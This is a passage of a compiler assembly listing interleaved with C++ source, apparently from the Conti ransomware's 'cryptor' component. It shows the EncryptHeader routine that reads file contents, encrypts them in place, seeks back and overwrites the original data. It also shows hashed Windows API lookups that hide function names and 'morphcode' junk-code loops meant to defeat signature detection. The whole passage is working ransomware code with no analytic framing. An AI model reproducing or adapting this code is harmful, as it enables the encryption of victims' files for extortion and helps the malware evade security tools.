  00283	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 93   : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);

  00288	4c 8d 4d f4	 lea	 r9, QWORD PTR BytesRead$[rbp-64]
  0028c	48 c7 44 24 20
	00 00 00 00	 mov	 QWORD PTR [rsp+32], 0
  00295	44 8b c7	 mov	 r8d, edi
  00298	49 8b d7	 mov	 rdx, r15
  0029b	48 8b cb	 mov	 rcx, rbx
  0029e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 935  : 		if (!Success || !BytesRead) {

  002a0	85 c0		 test	 eax, eax
  002a2	0f 84 25 04 00
	00		 je	 $LN327@EncryptHea
  002a8	83 7d f4 00	 cmp	 DWORD PTR BytesRead$[rbp-64], 0
  002ac	0f 84 1b 04 00
	00		 je	 $LN327@EncryptHea
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  002b2	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$4[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  002b9	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  002be	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-64]
  002c1	f7 e9		 imul	 ecx
  002c3	8b c2		 mov	 eax, edx
  002c5	c1 e8 1f	 shr	 eax, 31
  002c8	03 d0		 add	 edx, eax
  002ca	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  002cd	3b c8		 cmp	 ecx, eax
  002cf	74 4e		 je	 SHORT $LN83@EncryptHea

; 49   : 		_morph_var += (int)a + 2;

  002d1	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-64]
  002d4	8b 45 f4	 mov	 eax, DWORD PTR BytesRead$[rbp-64]
  002d7	83 c0 02	 add	 eax, 2
  002da	03 c8		 add	 ecx, eax
  002dc	89 4d f0	 mov	 DWORD PTR _morph_var$4[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  002df	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  002e2	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  002e7	7d 07		 jge	 SHORT $LN315@EncryptHea
  002e9	ff c8		 dec	 eax
  002eb	83 c8 fc	 or	 eax, -4
  002ee	ff c0		 inc	 eax
$LN315@EncryptHea:
  002f0	85 c0		 test	 eax, eax
  002f2	75 7c		 jne	 SHORT $LN82@EncryptHea
  002f4	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL75@EncryptHea:
  00300	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  00303	ff c0		 inc	 eax
  00305	89 45 f0	 mov	 DWORD PTR _morph_var$4[rbp-64], eax
  00308	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  0030b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00310	7d 07		 jge	 SHORT $LN314@EncryptHea
  00312	ff c8		 dec	 eax
  00314	83 c8 fc	 or	 eax, -4
  00317	ff c0		 inc	 eax
$LN314@EncryptHea:
  00319	85 c0		 test	 eax, eax
  0031b	74 e3		 je	 SHORT $LL75@EncryptHea

; 51   : 	}

  0031d	eb 51		 jmp	 SHORT $LN82@EncryptHea
$LN83@EncryptHea:

; 52   : 	else if (_morph_var % 2) {

  0031f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  00322	b9 02 00 00 00	 mov	 ecx, 2
  00327	2b 4d f4	 sub	 ecx, DWORD PTR BytesRead$[rbp-64]
  0032a	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  0032d	03 c1		 add	 eax, ecx
  0032f	89 45 f0	 mov	 DWORD PTR _morph_var$4[rbp-64], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00332	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00337	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-64]
  0033a	f7 e9		 imul	 ecx
  0033c	8b c2		 mov	 eax, edx
  0033e	c1 e8 1f	 shr	 eax, 31
  00341	03 d0		 add	 edx, eax
  00343	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00346	3b c8		 cmp	 ecx, eax
  00348	75 26		 jne	 SHORT $LN82@EncryptHea
  0034a	66 0f 1f 44 00
	00		 npad	 6
$LL77@EncryptHea:
  00350	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  00353	ff c0		 inc	 eax
  00355	89 45 f0	 mov	 DWORD PTR _morph_var$4[rbp-64], eax
  00358	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0035d	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-64]
  00360	f7 e9		 imul	 ecx
  00362	8b c2		 mov	 eax, edx
  00364	c1 e8 1f	 shr	 eax, 31
  00367	03 d0		 add	 edx, eax
  00369	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0036c	3b c8		 cmp	 ecx, eax
  0036e	74 e0		 je	 SHORT $LL77@EncryptHea
$LN82@EncryptHea:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 941  : 		TotalRead += BytesRead;

  00370	8b 75 f4	 mov	 esi, DWORD PTR BytesRead$[rbp-64]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00373	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00378	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$3[rbp-64], 1547201 ; 00179bc1H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 941  : 		TotalRead += BytesRead;

  0037f	4c 03 f6	 add	 r14, rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00382	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-64]
  00385	f7 e9		 imul	 ecx
  00387	8b c2		 mov	 eax, edx
  00389	c1 e8 1f	 shr	 eax, 31
  0038c	03 d0		 add	 edx, eax
  0038e	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00391	3b c8		 cmp	 ecx, eax
  00393	74 4a		 je	 SHORT $LN104@EncryptHea

; 49   : 		_morph_var += (int)a + 2;

  00395	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-64]
  00398	83 c1 02	 add	 ecx, 2
  0039b	41 03 ce	 add	 ecx, r14d
  0039e	89 4d f0	 mov	 DWORD PTR _morph_var$3[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  003a1	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  003a4	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  003a9	7d 07		 jge	 SHORT $LN312@EncryptHea
  003ab	ff c8		 dec	 eax
  003ad	83 c8 fc	 or	 eax, -4
  003b0	ff c0		 inc	 eax
$LN312@EncryptHea:
  003b2	85 c0		 test	 eax, eax
  003b4	75 7a		 jne	 SHORT $LN103@EncryptHea
  003b6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL96@EncryptHea:
  003c0	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  003c3	ff c0		 inc	 eax
  003c5	89 45 f0	 mov	 DWORD PTR _morph_var$3[rbp-64], eax
  003c8	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  003cb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  003d0	7d 07		 jge	 SHORT $LN311@EncryptHea
  003d2	ff c8		 dec	 eax
  003d4	83 c8 fc	 or	 eax, -4
  003d7	ff c0		 inc	 eax
$LN311@EncryptHea:
  003d9	85 c0		 test	 eax, eax
  003db	74 e3		 je	 SHORT $LL96@EncryptHea

; 51   : 	}

  003dd	eb 51		 jmp	 SHORT $LN103@EncryptHea
$LN104@EncryptHea:

; 52   : 	else if (_morph_var % 2) {

  003df	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  003e2	b9 02 00 00 00	 mov	 ecx, 2
  003e7	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  003ea	41 2b ce	 sub	 ecx, r14d
  003ed	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  003ef	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  003f4	89 4d f0	 mov	 DWORD PTR _morph_var$3[rbp-64], ecx
  003f7	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-64]
  003fa	f7 e9		 imul	 ecx
  003fc	8b c2		 mov	 eax, edx
  003fe	c1 e8 1f	 shr	 eax, 31
  00401	03 d0		 add	 edx, eax
  00403	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00406	3b c8		 cmp	 ecx, eax
  00408	75 26		 jne	 SHORT $LN103@EncryptHea
  0040a	66 0f 1f 44 00
	00		 npad	 6
$LL98@EncryptHea:
  00410	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  00413	ff c0		 inc	 eax
  00415	89 45 f0	 mov	 DWORD PTR _morph_var$3[rbp-64], eax
  00418	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0041d	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-64]
  00420	f7 e9		 imul	 ecx
  00422	8b c2		 mov	 eax, edx
  00424	c1 e8 1f	 shr	 eax, 31
  00427	03 d0		 add	 edx, eax
  00429	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0042c	3b c8		 cmp	 ecx, eax
  0042e	74 e0		 je	 SHORT $LL98@EncryptHea
$LN103@EncryptHea:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 946  : 		ECRYPT_encrypt_bytes(&FileInfo->CryptCtx, Buffer, Buffer, BytesRead);

  00430	44 8b 4d f4	 mov	 r9d, DWORD PTR BytesRead$[rbp-64]
  00434	49 8d 4d 18	 lea	 rcx, QWORD PTR [r13+24]
  00438	4d 8b c7	 mov	 r8, r15
  0043b	49 8b d7	 mov	 rdx, r15
  0043e	e8 00 00 00 00	 call	 ECRYPT_encrypt_bytes
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00443	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$2[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0044a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0044f	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-64]
  00452	f7 e9		 imul	 ecx
  00454	8b c2		 mov	 eax, edx
  00456	c1 e8 1f	 shr	 eax, 31
  00459	03 d0		 add	 edx, eax
  0045b	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0045e	3b c8		 cmp	 ecx, eax
  00460	74 4d		 je	 SHORT $LN127@EncryptHea

; 49   : 		_morph_var += (int)a + 2;

  00462	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-64]
  00465	83 c1 02	 add	 ecx, 2
  00468	41 03 cf	 add	 ecx, r15d
  0046b	89 4d f0	 mov	 DWORD PTR _morph_var$2[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0046e	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  00471	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00476	7d 07		 jge	 SHORT $LN309@EncryptHea
  00478	ff c8		 dec	 eax
  0047a	83 c8 fc	 or	 eax, -4
  0047d	ff c0		 inc	 eax
$LN309@EncryptHea:
  0047f	85 c0		 test	 eax, eax
  00481	75 7d		 jne	 SHORT $LN126@EncryptHea
  00483	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL119@EncryptHea:
  00490	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  00493	ff c0		 inc	 eax
  00495	89 45 f0	 mov	 DWORD PTR _morph_var$2[rbp-64], eax
  00498	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  0049b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  004a0	7d 07		 jge	 SHORT $LN308@EncryptHea
  004a2	ff c8		 dec	 eax
  004a4	83 c8 fc	 or	 eax, -4
  004a7	ff c0		 inc	 eax
$LN308@EncryptHea:
  004a9	85 c0		 test	 eax, eax
  004ab	74 e3		 je	 SHORT $LL119@EncryptHea

; 51   : 	}

  004ad	eb 51		 jmp	 SHORT $LN126@EncryptHea
$LN127@EncryptHea:

; 52   : 	else if (_morph_var % 2) {

  004af	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  004b2	b9 02 00 00 00	 mov	 ecx, 2
  004b7	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  004ba	41 2b cf	 sub	 ecx, r15d
  004bd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  004bf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  004c4	89 4d f0	 mov	 DWORD PTR _morph_var$2[rbp-64], ecx
  004c7	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-64]
  004ca	f7 e9		 imul	 ecx
  004cc	8b c2		 mov	 eax, edx
  004ce	c1 e8 1f	 shr	 eax, 31
  004d1	03 d0		 add	 edx, eax
  004d3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  004d6	3b c8		 cmp	 ecx, eax
  004d8	75 26		 jne	 SHORT $LN126@EncryptHea
  004da	66 0f 1f 44 00
	00		 npad	 6
$LL121@EncryptHea:
  004e0	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  004e3	ff c0		 inc	 eax
  004e5	89 45 f0	 mov	 DWORD PTR _morph_var$2[rbp-64], eax
  004e8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  004ed	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-64]
  004f0	f7 e9		 imul	 ecx
  004f2	8b c2		 mov	 eax, edx
  004f4	c1 e8 1f	 shr	 eax, 31
  004f7	03 d0		 add	 edx, eax
  004f9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  004fc	3b c8		 cmp	 ecx, eax
  004fe	74 e0		 je	 SHORT $LL121@EncryptHea
$LN126@EncryptHea:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 950  : 		Offset.QuadPart = -((LONGLONG)BytesRead);

  00500	8b 5d f4	 mov	 ebx, DWORD PTR BytesRead$[rbp-64]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  00503	ba 0f 00 00 00	 mov	 edx, 15
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 951  : 		if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {

  00508	49 8b 7d 08	 mov	 rdi, QWORD PTR [r13+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  0050c	41 b8 a7 1b e5
	d6		 mov	 r8d, -689628249		; d6e51ba7H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 950  : 		Offset.QuadPart = -((LONGLONG)BytesRead);

  00512	48 f7 db	 neg	 rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  00515	44 8d 4a 4a	 lea	 r9d, QWORD PTR [rdx+74]
  00519	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 250  : 	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

  0051e	41 b9 01 00 00
	00		 mov	 r9d, 1
  00524	45 33 c0	 xor	 r8d, r8d
  00527	48 8b d3	 mov	 rdx, rbx
  0052a	48 8b cf	 mov	 rcx, rdi
  0052d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 951  : 		if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {

  0052f	85 c0		 test	 eax, eax
  00531	0f 84 96 01 00
	00		 je	 $LN327@EncryptHea
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00537	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$8[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0053e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00543	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$8[rbp-64]
  00546	f7 e9		 imul	 ecx
  00548	8b c2		 mov	 eax, edx
  0054a	c1 e8 1f	 shr	 eax, 31
  0054d	03 d0		 add	 edx, eax
  0054f	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00552	3b c8		 cmp	 ecx, eax
  00554	74 49		 je	 SHORT $LN150@EncryptHea

; 49   : 		_morph_var += (int)a + 2;

  00556	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$8[rbp-64]
  00559	83 c1 02	 add	 ecx, 2
  0055c	03 cb		 add	 ecx, ebx
  0055e	89 4d f0	 mov	 DWORD PTR _morph_var$8[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00561	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$8[rbp-64]
  00564	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00569	7d 07		 jge	 SHORT $LN306@EncryptHea
  0056b	ff c8		 dec	 eax
  0056d	83 c8 fc	 or	 eax, -4
  00570	ff c0		 inc	 eax
$LN306@EncryptHea:
  00572	85 c0		 test	 eax, eax
  00574	75 7a		 jne	 SHORT $LN149@EncryptHea
  00576	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL142@EncryptHea:
  00580	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$8[rbp-64]
  00583	ff c0		 inc	 eax
  00585	89 45 f0	 mov	 DWORD PTR _morph_var$8[rbp-64], eax
  00588	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$8[rbp-64]
  0058b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00590	7d 07		 jge	 SHORT $LN305@EncryptHea
  00592	ff c8		 dec	 eax
  00594	83 c8 fc	 or	 eax, -4
  00597	ff c0		 inc	 eax
$LN305@EncryptHea:
  00599	85 c0		 test	 eax, eax
  0059b	74 e3		 je	 SHORT $LL142@EncryptHea

; 51   : 	}

  0059d	eb 51		 jmp	 SHORT $LN149@EncryptHea
$LN150@EncryptHea:

; 52   : 	else if (_morph_var % 2) {

  0059f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$8[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  005a2	b9 02 00 00 00	 mov	 ecx, 2
  005a7	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$8[rbp-64]
  005aa	2b cb		 sub	 ecx, ebx
  005ac	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  005ae	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  005b3	89 4d f0	 mov	 DWORD PTR _morph_var$8[rbp-64], ecx
  005b6	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$8[rbp-64]
  005b9	f7 e9		 imul	 ecx
  005bb	8b c2		 mov	 eax, edx
  005bd	c1 e8 1f	 shr	 eax, 31
  005c0	03 d0		 add	 edx, eax
  005c2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  005c5	3b c8		 cmp	 ecx, eax
  005c7	75 27		 jne	 SHORT $LN149@EncryptHea
  005c9	0f 1f 80 00 00
	00 00		 npad	 7
$LL144@EncryptHea:
  005d0	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$8[rbp-64]
  005d3	ff c0		 inc	 eax
  005d5	89 45 f0	 mov	 DWORD PTR _morph_var$8[rbp-64], eax
  005d8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  005dd	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$8[rbp-64]
  005e0	f7 e9		 imul	 ecx
  005e2	8b c2		 mov	 eax, edx
  005e4	c1 e8 1f	 shr	 eax, 31
  005e7	03 d0		 add	 edx, eax
  005e9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  005ec	3b c8		 cmp	 ecx, eax
  005ee	74 e0		 je	 SHORT $LL144@EncryptHea
$LN149@EncryptHea:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 957  : 		Success = WriteFullData(FileInfo->FileHandle, Buffer, BytesToWrite);

  005f0	49 8b 4d 08	 mov	 rcx, QWORD PTR [r13+8]
  005f4	44 8b c6	 mov	 r8d, esi
  005f7	49 8b d7	 mov	 rdx, r15
  005fa	e8 00 00 00 00	 call	 ?WriteFullData@@YAHPEAX0K@Z ; WriteFullData

; 958  : 		if (!Success) {

  005ff	85 c0		 test	 eax, eax
  00601	0f 84 c6 00 00
	00		 je	 $LN327@EncryptHea
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00607	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$1[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  0060e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00613	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-64]
  00616	f7 e9		 imul	 ecx
  00618	8b c2		 mov	 eax, edx
  0061a	c1 e8 1f	 shr	 eax, 31
  0061d	03 d0		 add	 edx, eax
  0061f	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00622	3b c8		 cmp	 ecx, eax
  00624	74 49		 je	 SHORT $LN171@EncryptHea

; 49   : 		_morph_var += (int)a + 2;

  00626	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-64]
  00629	83 c1 02	 add	 ecx, 2
  0062c	03 ce		 add	 ecx, esi
  0062e	89 4d f0	 mov	 DWORD PTR _morph_var$1[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00631	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  00634	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00639	7d 07		 jge	 SHORT $LN303@EncryptHea
  0063b	ff c8		 dec	 eax
  0063d	83 c8 fc	 or	 eax, -4
  00640	ff c0		 inc	 eax
$LN303@EncryptHea:
  00642	85 c0		 test	 eax, eax
  00644	75 7a		 jne	 SHORT $LN170@EncryptHea
  00646	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL163@EncryptHea:
  00650	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  00653	ff c0		 inc	 eax
  00655	89 45 f0	 mov	 DWORD PTR _morph_var$1[rbp-64], eax
  00658	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  0065b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00660	7d 07		 jge	 SHORT $LN302@EncryptHea
  00662	ff c8		 dec	 eax
  00664	83 c8 fc	 or	 eax, -4
  00667	ff c0		 inc	 eax
$LN302@EncryptHea:
  00669	85 c0		 test	 eax, eax
  0066b	74 e3		 je	 SHORT $LL163@EncryptHea

; 51   : 	}

  0066d	eb 51		 jmp	 SHORT $LN170@EncryptHea
$LN171@EncryptHea:

; 52   : 	else if (_morph_var % 2) {

  0066f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  00672	b9 02 00 00 00	 mov	 ecx, 2
  00677	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  0067a	2b ce		 sub	 ecx, esi
  0067c	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0067e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00683	89 4d f0	 mov	 DWORD PTR _morph_var$1[rbp-64], ecx
  00686	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-64]
  00689	f7 e9		 imul	 ecx
  0068b	8b c2		 mov	 eax, edx
  0068d	c1 e8 1f	 shr	 eax, 31
  00690	03 d0		 add	 edx, eax
  00692	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00695	3b c8		 cmp	 ecx, eax
  00697	75 27		 jne	 SHORT $LN170@EncryptHea
  00699	0f 1f 80 00 00
	00 00		 npad	 7
$LL165@EncryptHea:
  006a0	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$1[rbp-64]
  006a3	ff c0		 inc	 eax
  006a5	89 45 f0	 mov	 DWORD PTR _morph_var$1[rbp-64], eax
  006a8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  006ad	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$1[rbp-64]
  006b0	f7 e9		 imul	 ecx
  006b2	8b c2		 mov	 eax, edx
  006b4	c1 e8 1f	 shr	 eax, 31
  006b7	03 d0		 add	 edx, eax
  006b9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  006bc	3b c8		 cmp	 ecx, eax
  006be	74 e0		 je	 SHORT $LL165@EncryptHea
$LN170@EncryptHea:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 922  : 	while (TotalRead < BytesToEncrypt) {

  006c0	49 81 fe 00 00
	10 00		 cmp	 r14, 1048576		; 00100000H
  006c7	0f 8c 73 f9 ff
	ff		 jl	 $LL2@EncryptHea
$LN327@EncryptHea:
  006cd	48 8b b4 24 90
	00 00 00	 mov	 rsi, QWORD PTR [rsp+144]

; 959  : 			break;
; 960  : 		}
; 961  : 
; 962  : 		morphcode(BytesToWrite);
; 963  : 
; 964  : 	}
; 965  : 
; 966  : 	return TRUE;
; 967  : }

  006d5	b8 01 00 00 00	 mov	 eax, 1
  006da	48 8b 4d f8	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-64]
  006de	48 33 cc	 xor	 rcx, rsp
  006e1	e8 00 00 00 00	 call	 __security_check_cookie
  006e6	48 83 c4 40	 add	 rsp, 64			; 00000040H
  006ea	41 5f		 pop	 r15
  006ec	41 5e		 pop	 r14
  006ee	41 5d		 pop	 r13
  006f0	41 5c		 pop	 r12
  006f2	5f		 pop	 rdi
  006f3	5b		 pop	 rbx
  006f4	5d		 pop	 rbp
  006f5	c3		 ret	 0
?EncryptHeader@@YAHPEAUfile_info@cryptor@@PEAE_K2@Z ENDP ; EncryptHeader
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
